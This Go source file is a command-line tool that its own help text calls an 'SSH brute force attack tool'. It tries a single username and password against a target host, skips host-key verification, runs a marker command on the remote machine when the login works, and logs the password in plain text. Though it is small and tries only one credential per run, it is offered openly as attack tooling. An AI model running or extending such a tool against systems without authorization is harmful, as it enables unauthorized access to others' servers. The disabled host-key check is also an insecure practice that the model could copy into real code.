package main

import (
	"fmt"
	"os"

	"golang.org/x/crypto/ssh"

	"github.com/akamensky/argparse"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

func BruteForce(host string, port int, username string, password string) bool {
	if host == "" || port == 0 || username == "" || password == "" {
		log.Error().Msg("Invalid parameters provided")
		return false
	}

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	addr := host + ":" + fmt.Sprint(port)

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		log.Error().Err(err).Msg("Failed to connect to SSH server")
		return false
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		log.Error().Err(err).Msg("Failed to create SSH session")
		return false
	}
	defer session.Close()

	err = session.Run("touch /tmp/ssh-bf-success")
	if err != nil {
		log.Error().Err(err).Msg("Failed to run command on SSH server")
		return false
	}

	log.Info().Msg("Brute force successful")
	return true
}

func main() {

	// logger setup
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	logger := log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()

	// argument parser setup
	parser := argparse.NewParser("ssh-bf", "SSH brute force attack tool")

	host := parser.String("", "host", &argparse.Options{
		Required: true,
		Help:     "Target host",
	})

	port := parser.Int("", "port", &argparse.Options{
		Required: true,
		Help:     "Target port",
	})

	username := parser.String("", "username", &argparse.Options{
		Required: true,
		Help:     "Account username to brute force",
	})

	password := parser.String("", "password", &argparse.Options{
		Required: true,
		Help:     "password to brute force",
	})

	err := parser.Parse(os.Args)
	if err != nil {
		logger.Fatal().Err(err).Msg("Failed to parse arguments")
	}

	// try to brute force
	if !BruteForce(*host, *port, *username, *password) {
		logger.Warn().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force failed")
	} else {
		logger.Info().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force successful")
	}
}


